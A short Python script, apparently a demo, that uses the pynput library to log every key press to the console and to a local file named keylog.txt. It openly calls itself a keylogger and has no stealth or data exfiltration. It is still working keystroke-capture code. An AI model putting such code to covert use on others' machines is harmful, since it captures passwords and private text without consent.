from pynput import keyboard

def keyPressed(key):
    print(str(key))  # Print to console

    with open("keylog.txt", 'a') as logkey:
        try:
            # Try to get the actual character
            char = key.char
            logkey.write(char)
        except AttributeError:
            # Handle special keys (like shift, space, enter)
            logkey.write(f'[{key.name}]')

if __name__ == "__main__":
    print(" Keylogger is running... Press keys (Ctrl+C to stop).")
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input("Press Enter to stop...\n")
